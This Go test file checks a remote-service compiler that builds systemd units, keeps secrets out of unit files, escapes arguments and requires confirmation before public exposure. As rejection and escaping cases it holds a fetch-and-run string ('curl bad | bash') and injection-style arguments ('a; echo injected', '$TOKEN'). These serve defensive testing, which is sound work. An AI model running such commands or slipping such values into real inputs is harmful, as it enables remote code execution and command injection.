package remoteservice

import (
	"strings"
	"testing"
)

func TestCompilePrivateServiceProducesTypedUnitAndStatusCommands(t *testing.T) {
	workload := serviceFixture()
	compiled, err := CompileWorkload("worker-a", workload)
	if err != nil {
		t.Fatal(err)
	}
	unit := string(compiled.Files[0].Content)
	for _, expected := range []string{
		`ExecStart="/usr/bin/node" "server.js" "--label=hello world"`,
		`WorkingDirectory="/srv/example"`,
		`Environment="MODE=production"`,
		`EnvironmentFile="/run/dirextalk/secrets/api.env"`,
		"Restart=on-failure",
	} {
		if !strings.Contains(unit, expected) {
			t.Errorf("unit missing %q:\n%s", expected, unit)
		}
	}
	if strings.Contains(unit, "secret-value") || len(compiled.SecretBindings) != 1 || compiled.SecretBindings[0].Reference.Name != "api-token" {
		t.Fatalf("secret reference was not kept out of unit: %#v\n%s", compiled.SecretBindings, unit)
	}
	if compiled.Caddy != nil {
		t.Fatal("private service unexpectedly compiled public exposure")
	}
	if compiled.Status.Health == nil || compiled.Status.Health.Executable != "/usr/bin/curl" || compiled.Status.Load.Arguments[0] != "/proc/loadavg" || compiled.Status.LogTail.Executable != "/usr/bin/journalctl" {
		t.Fatalf("incomplete live status commands: %#v", compiled.Status)
	}
}

func TestCompileRejectsShellStringAndSecretCollision(t *testing.T) {
	tests := []Workload{serviceFixture(), serviceFixture()}
	tests[0].Command = Command{Executable: "sh -c 'curl bad | bash'"}
	tests[1].Environment["API_TOKEN"] = "secret-value"
	for index, workload := range tests {
		if _, err := CompileWorkload("worker-a", workload); err != ErrInvalid {
			t.Errorf("case %d error = %v, want ErrInvalid", index, err)
		}
	}
}

func TestSystemdArgumentsEscapeExpansionWithoutUsingShell(t *testing.T) {
	workload := serviceFixture()
	workload.Command.Arguments = []string{`$TOKEN`, `100%`, `a; echo injected`, `a"b\\c`}
	compiled, err := CompileWorkload("worker-a", workload)
	if err != nil {
		t.Fatal(err)
	}
	unit := string(compiled.Files[0].Content)
	if !strings.Contains(unit, `ExecStart="/usr/bin/node" "$$TOKEN" "100%%" "a; echo injected" "a\"b\\\\c"`) {
		t.Fatalf("systemd argv was not safely encoded:\n%s", unit)
	}
	for _, command := range compiled.Apply {
		if command.Executable == "/bin/sh" || command.Executable == "/usr/bin/sh" {
			t.Fatalf("compiled shell execution: %#v", command)
		}
	}
}

func TestExposureRequiresExactConfirmation(t *testing.T) {
	workload := serviceFixture()
	exposure := Exposure{Enabled: true, Hostname: "app.example.com", TLS: true}
	exposure.Confirmation = ExactConfirmation{Proof: "public-confirmed", Digest: exposureDigest("worker-a", workload.ID, workload.Service.Port, exposure)}
	workload.Exposure = &exposure
	compiled, err := CompileWorkload("worker-a", workload)
	if err != nil {
		t.Fatal(err)
	}
	if compiled.Caddy == nil || !strings.Contains(string(compiled.Caddy.File.Content), "reverse_proxy 127.0.0.1:8080") {
		t.Fatalf("Caddy config = %#v", compiled.Caddy)
	}

	changed := workload
	changed.Service = &Service{Port: 8081, HealthPath: "/healthz"}
	if _, err := CompileWorkload("worker-a", changed); err != ErrNotConfirmed {
		t.Fatalf("changed exposure reused confirmation: %v", err)
	}
}

func TestWorkerQuoteIncludesOrdinaryPublicIPv4Cost(t *testing.T) {
	quote, err := NewWorkerHourlyQuote("USD", 20_000, 5_000)
	if err != nil || quote.PublicIPv4Micros != 5_000 || quote.TotalMicros != 25_000 {
		t.Fatalf("quote=%#v err=%v", quote, err)
	}
	if (Worker{}).Lifecycle.DestroyAfterTask {
		t.Fatal("worker lifecycle must retain by default")
	}
}

func TestCompileJobSurvivesSSHWithoutPublicExposure(t *testing.T) {
	job := Workload{ID: "build", Kind: WorkloadJob, User: "ec2-user", WorkDir: "/srv/build", Command: Command{Executable: "/usr/bin/make", Arguments: []string{"all"}}}
	compiled, err := CompileWorkload("worker-a", job)
	if err != nil {
		t.Fatal(err)
	}
	unit := string(compiled.Files[0].Content)
	if !strings.Contains(unit, "Type=oneshot") || compiled.Apply[1].Arguments[0] != "start" || compiled.Status.Health != nil {
		t.Fatalf("job compilation = %#v\n%s", compiled, unit)
	}
}

func serviceFixture() Workload {
	return Workload{
		ID: "api", Kind: WorkloadService, User: "ec2-user", WorkDir: "/srv/example",
		Command:     Command{Executable: "/usr/bin/node", Arguments: []string{"server.js", "--label=hello world"}},
		Environment: map[string]string{"MODE": "production"},
		SecretEnv:   map[string]SecretReference{"API_TOKEN": {Store: "agent", Name: "api-token", Revision: "7"}},
		Service:     &Service{Port: 8080, HealthPath: "/healthz", LogLines: 50},
	}
}
